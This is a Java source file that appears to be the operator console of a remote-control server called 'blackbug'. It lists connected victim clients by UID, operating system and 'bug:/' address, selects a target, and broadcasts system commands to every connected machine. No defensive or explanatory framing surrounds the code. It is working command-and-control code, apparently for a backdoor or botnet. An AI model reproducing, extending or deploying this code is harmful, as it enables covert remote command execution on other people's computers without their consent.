package pers.adlered.blackbug.server.connection;

import pers.adlered.blackbug.server.Temp;
import pers.adlered.blackbug.server.connection.storge.StreamStorge;
import pers.adlered.blackbug.server.tools.ConsoleTable;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Iterator;
import java.util.stream.Stream;

public class ConsoleHandler {
    public static String handle(String command) {
        String result = "";
        if (command.equals("/help")) {
            result += "======== HELP ========\n";
            result += "/setuid [UID]\n";
            result += "-- Set UID which you want to control\n";
            result += "/list\n";
            result += "-- Show available UID(S)\n";
            result += "/cmd [command]\n";
            result += "-- Execute a system command (All system support)\n";
            result += "/broadcast [command]\n";
            result += "-- Execute a system command to all connections (All system support)\n";
            result += "======== PLEH ========";
        }
        if (command.startsWith("/setuid ")) {
            String UID = command.replaceFirst("/setuid ", "");
            Temp.currentUID = Integer.parseInt(UID);
            result += "[Command] UID " + Temp.currentUID + " set.";
        }
        if (command.equals("/list")) {
            //result += "======== UID ========\n";
            ConsoleTable consoleTable = new ConsoleTable(3, true);
            consoleTable.appendRow();
            consoleTable.appendColumn("UID").appendColumn("OS Detail").appendColumn("Address");
            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
            while (iterator.hasNext()) {
                int key = iterator.next();
                //result += "UID-" + key + " | ";
                //result += StreamStorge.detailOfOSDetail.get(key) + " | ";
                //result += "bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress() + "\r\n";
                consoleTable.appendRow();
                consoleTable.appendColumn(key).appendColumn(StreamStorge.detailOfOSDetail.get(key)).appendColumn("bug:/" + StreamStorge.sockets.get(key).getRemoteSocketAddress());
            }
            //result += "======== DIU ========\n";
            result += consoleTable.toString();
        }
        if (command.startsWith("/broadcast ")) {
            String broadcastCommand = "/cmd " + command.replaceFirst("/broadcast ", "");
            Iterator<Integer> iterator = StreamStorge.sockets.keySet().iterator();
            while (iterator.hasNext()) {
                int key = iterator.next();
                try {
                    BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(StreamStorge.sockets.get(key).getOutputStream(), "UTF-8"));
                    bufferedWriter.write(broadcastCommand);
                    bufferedWriter.flush();
                } catch (IOException IOE) {
                }
            }
            result += "[Command] Broadcast message: " + broadcastCommand;
        }
        return result;
    }
}
